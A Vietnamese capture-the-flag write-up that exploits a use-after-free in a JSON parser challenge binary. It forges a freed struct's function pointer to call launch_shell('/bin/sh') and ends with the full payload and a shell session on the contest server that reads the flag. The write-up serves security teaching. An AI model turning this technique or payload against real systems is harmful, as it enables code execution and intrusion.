# PWN – heap-fengshui-json-parser

## - Kiểm tra file:

```
$ file ./json_parser
json_parser: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, ..., stripped
```

Kết quả cho thấy đây là file ELF 64-bit, chạy trên Linux. Binary bị strip, nhưng bài có cho kèm source `json_parser.cpp`, nên ta đọc source để tìm bug sẽ nhanh hơn.

## - Chạy thử chương trình

Chương trình nhận các lệnh: `load JSON | del KEY | sample HEXWORDS | symbols | run | reset | quit`

(Ở đây hàm quan trọng là `launch_shell()`. Hàm này sẽ gọi shell nếu tham số truyền vào bắt đầu bằng chuỗi `/bin/sh`.)

-> Vậy mục tiêu của ta là làm sao để chương trình gọi được: `launch_shell("/bin/sh");`

## - Xem struct trong file cpp

```cpp
struct JsonValue {
    unsigned int type;      // +0x00
    unsigned int length;    // +0x04
    char data[40];          // +0x08
    JsonValue *child;       // +0x30
    Action action;          // +0x38
};
```

- `action` : hàm sẽ được gọi khi `run`
- Khi chạy lệnh `run`, chương trình sẽ gọi: `v->action(v->data);`

-> Nghĩa là nếu ta điều khiển được `data` và `action`, ta có thể gọi: `launch_shell("/bin/sh");`

## - Bug nằm ở hàm delete (ở hàm free)

```cpp
void cmd_delete(const char *key) {
    if (!g_model || !g_model->child) {
        puts("error: no nested object");
        return;
    }
    if (strcmp(g_loaded_key, key) != 0) {
        puts("error: key not found");
        return;
    }
    value_free(g_model->child);
    puts("ok: node deleted");
}
```

-> chương trình không set lại: `g_model->child = nullptr` (nên `g_model->child` vẫn trỏ vào vùng nhớ đã free) -> Lỗi UAF

## - Xem tiếp allocator tự chế

```cpp
void *value_alloc() {
    if (g_free_values) {
        JsonValue *v = g_free_values;
        g_free_values = g_free_values->child;
        return v;
    }
    return malloc(sizeof(JsonValue));
}

void value_free(JsonValue *v) {
    if (!v) return;
    v->child = g_free_values;
    g_free_values = v;
}
```

- Khi `del a`, object cũ được đưa vào `g_free_values`
- Sau đó nếu gọi `sample`, chương trình sẽ cấp phát lại đúng chunk vừa bị free
- `sample` cho ta ghi 8 qword, nên ta có thể fake toàn bộ struct `JsonValue`

## - Hướng exploit

1. `load {"a":"x"}`
   -> tạo `g_model->child`
2. `del a`
   -> free `g_model->child` nhưng không xoá con trỏ
3. `sample ...`
   -> lấy lại đúng chunk vừa free và ghi đè struct `JsonValue`
4. `run`
   -> chương trình gọi `fake_action(fake_data)`

Ta cần fake struct như sau:

```
type   = 1
length = 7
data   = "/bin/sh"
child  = 0
action = launch_shell
```

Địa chỉ `launch_shell` lấy được từ lệnh `symbols`:

```
launch_shell = 0x401510
```

## - Tính payload

- `type=1 ; length=7` nằm chung 8 byte đầu
  -> qword: `0x0000000700000001`
- `/bin/sh` sang dạng little endian `"/bin/sh\x00"` (7 byte + 1 byte `\x00`)
  -> `0x0068732f6e69622f`
- `action` -> adr `launch_shell`

=> payload full : `sample 700000001 68732f6e69622f 0 0 0 0 0 401510`

## - Chạy trên server

```
$ nc 222.255.138.122 10181
> load {"a":"x"}
> del a
> sample 700000001 68732f6e69622f 0 0 0 0 0 401510
> run
$ cat /flag.txt
flag{baf2be26-a186-451f-9b86-e296c675abd5}
```
